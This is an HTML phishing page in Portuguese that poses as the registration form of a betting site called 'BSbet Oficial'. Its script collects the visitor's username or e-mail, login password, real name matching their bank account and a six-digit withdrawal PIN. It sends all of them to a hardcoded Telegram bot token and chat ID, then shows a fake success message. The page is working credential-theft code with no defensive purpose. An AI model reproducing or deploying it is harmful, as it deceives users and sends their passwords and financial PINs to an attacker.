<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BSbet Oficial</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --y: #f3c350; --bg: rgba(26,26,26,0.95); --in: #2a2a2a; --txt: #888; --err: #ff4d4d; }
        body { 
            margin: 0; padding: 0; font-family: sans-serif; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh;
            background-color: #0d0d0d;
            background-image: url('https://static.vecteezy.com/system/resources/previews/001/955/352/original/abstract-black-and-grey-hexagon-background-free-vector.jpg');
            background-size: cover; background-attachment: fixed;
        }
        .card { background: var(--bg); width: 90%; max-width: 380px; padding: 25px; border-radius: 20px; box-shadow: 0 15px 35px #000; border: 1px solid #333; }
        .logo { text-align: center; font-size: 32px; font-weight: bold; font-style: italic; margin-bottom: 20px; color: white; }
        .logo span { color: var(--y); }
        .tabs { display: flex; border-bottom: 1px solid #333; margin-bottom: 20px; }
        .tab { padding: 10px; color: var(--txt); cursor: pointer; width: 50%; text-align: center; font-weight: bold; }
        .tab.active { color: var(--y); border-bottom: 3px solid var(--y); }
        .box { background: var(--in); border: 1px solid #444; border-radius: 10px; display: flex; align-items: center; padding: 12px; margin-bottom: 12px; }
        .box i { color: var(--txt); width: 25px; text-align: center; margin-right: 10px; }
        .box input { background: transparent; border: none; color: white; width: 100%; outline: none; font-size: 16px; }
        .btn { background: linear-gradient(180deg, #f7d06d, #d9a026); color: #1a1a1a; width: 100%; padding: 15px; border: none; border-radius: 10px; font-weight: bold; font-size: 16px; margin-top: 10px; cursor: pointer; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .hint { color: var(--y); font-size: 11px; margin: -5px 0 15px 5px; }
        .error { border-color: var(--err) !important; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">BS<span>bet</span></div>
    <div class="tabs">
        <div class="tab active">Registro</div>
        <div class="tab">Login</div>
    </div>

    <form id="f-reg">
        <div class="box"><i class="fa-solid fa-user"></i><input type="text" id="u" placeholder="Usu√°rio / E-mail" required></div>
        <div class="box"><i class="fa-solid fa-lock"></i><input type="password" id="p1" placeholder="Senha login" required></div>
        <div class="box"><i class="fa-solid fa-check"></i><input type="password" id="p2" placeholder="Confirmar senha login" required></div>
        <div class="box"><i class="fa-solid fa-id-card"></i><input type="text" id="n" placeholder="Nome Real" required></div>
        <p class="hint">Igual ao nome do banco</p>
        <div class="box"><i class="fa-solid fa-shield"></i><input type="password" id="s1" placeholder="Senha saque (6 d√≠gitos)" maxlength="6" required></div>
        <div class="box"><i class="fa-solid fa-circle-check"></i><input type="password" id="s2" placeholder="Confirmar saque" required></div>
        
        <button type="submit" id="btn-r" class="btn">REGISTRAR</button>
    </form>
</div>

<script>
    // --- IMPORTANTE: COLOQUE SEUS DADOS AQUI ---
    const TOKEN = "8599880345:AAGQy8ofddvyj-efl_lFUo44KMLEt1uuxMo"; 
    const CHAT_ID = "4996441181";

    const form = document.getElementById('f-reg');
    const btn = document.getElementById('btn-r');

    form.onsubmit = function(e) {
        e.preventDefault();

        // Valida√ß√£o r√°pida antes de enviar
        const p1 = document.getElementById('p1').value;
        const p2 = document.getElementById('p2').value;
        const s1 = document.getElementById('s1').value;
        const s2 = document.getElementById('s2').value;

        if (p1 !== p2) { alert("As senhas de login n√£o conferem!"); return; }
        if (s1 !== s2) { alert("As senhas de saque n√£o conferem!"); return; }
        if (s1.length < 6) { alert("A senha de saque deve ter 6 d√≠gitos!"); return; }

        btn.disabled = true;
        btn.innerText = "ENVIANDO...";

        const msg = `üîî *NOVO CADASTRO* üîî\n\nüë§ Usu√°rio: ${document.getElementById('u').value}\nüîë Senha: ${p1}\nüí≥ Nome: ${document.getElementById('n').value}\nüí∞ Saque: ${s1}`;

        // Usando HTTPS obrigatoriamente
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: msg,
                parse_mode: 'Markdown'
            })
        })
        .then(res => {
            if (res.ok) {
                alert("‚úÖ Cadastro realizado com sucesso!");
                location.reload();
            } else {
                alert("‚ùå Erro no Bot. Verifique o Token e o Chat ID.");
                btn.disabled = false;
                btn.innerText = "REGISTRAR";
            }
        })
        .catch(err => {
            alert("‚ùå Erro de conex√£o.");
            btn.disabled = false;
            btn.innerText = "REGISTRAR";
        });
    };
</script>

</body>
</html>
